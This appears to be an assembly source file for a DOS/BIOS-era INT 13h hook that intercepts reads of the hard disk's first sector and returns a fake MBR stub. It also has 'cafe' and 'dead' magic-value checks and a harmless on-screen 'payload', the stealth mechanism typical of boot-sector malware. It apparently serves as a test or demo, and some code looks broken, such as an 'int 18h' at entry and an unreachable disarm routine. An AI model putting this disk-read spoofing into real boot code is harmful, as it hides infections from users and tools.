	P286
	.MODEL TINY

_TEXT	SEGMENT PUBLIC 'CODE'
	PUBLIC _biosInt13h, _fakeMBR, _fakePartition, _fakeDrive

_biosInt13h:	dq 0
_fakeDrive:	db 80h
_fakePartition:	db 0
_fakeMBR:	db "This is fake MBR stub. If you see this the actual MBR was not loaded yet."
		db 439 dup(0)
_callCount:	db 3

	EXTRN _biosputchar

	PUBLIC _int13h
_int13h	PROC FAR
	int	18h
	pusha
	; cafe
	cmp	AX, 0CAFEh
	jz	@cafe
	; disarm
	cmp	AX, 0DEADh
        jnz	@skipDisarm
	call	@disarm
	popa
	xor	AH, AH
	clc
	iret
@skipDisarm:
	; mbr
	cmp	AH, 02h	; READ SECTORS
	jz	@mbr
@chain:
	; Usless payload
        mov	AX, 0B810h
	mov	ES, AX
        xor	AX, AX
        mov	AL, byte ptr _callCount
        shl	AX, 2
        mov 	DI, AX
        xor	AX, AX
        mov	AL, byte ptr _callCount
	mov	CX, 3100h
        or	AX, CX
        stosw

        ; Chain interrupt handler
	popa
	push	word ptr CS:[_biosInt13h + 2]
	push	word ptr CS:[_biosInt13h]
	retf
@cafe:
	popa
	mov	AX, 0BEEFh
	clc
	iret
@mbr:
	mov	BP, SP
	cmp	CX, 1h	; track/sector
	jnz	@chain
	cmp	DH, 0
	jnz	@chain	; head
	cmp	DL, byte ptr CS:_fakeDrive	; drive
	jnz	@chain
	cmp	AL, 1	; one sector
	jnz	@chain
	push	AX
	mov	AH, byte ptr CS:_callCount
	dec	AH
	mov	byte ptr CS:_callCount, AH
	pop	AX
	jnz	@fake
	call	@disarm
        jmp	@chain
@fake:
	; Fake MBR
	push	DS
	push	SI
	push	CS
	pop	DS
	lea	SI, word ptr CS:[_fakeMBR]
	mov	DI, BX
	mov	CX, 100h
	rep
	movsw
	pop	SI
	pop	DS
	; Clearing CF in stack
	mov	AX, SS:[BP + 20]
	and	AX, 0FFFEh
	mov	SS:[BP + 20], AX

	popa
	xor	AH, AH
	iret
@disarm:
	retn
	push	AX
        push	DI
        push	SI
	xor	AX, AX
        push	ES
        push	DS
	push	AX
	pop	ES
	push	CS
	pop	DS
	mov	DI, 4Ch
	mov	SI, OFFSET _biosInt13h
	mov	CX, 2
	rep
	movsw
        pop	DS
        pop	ES
        pop	DI
        pop	SI
        pop	AX
	retn

_int13h	ENDP
_TEXT	ENDS
	END
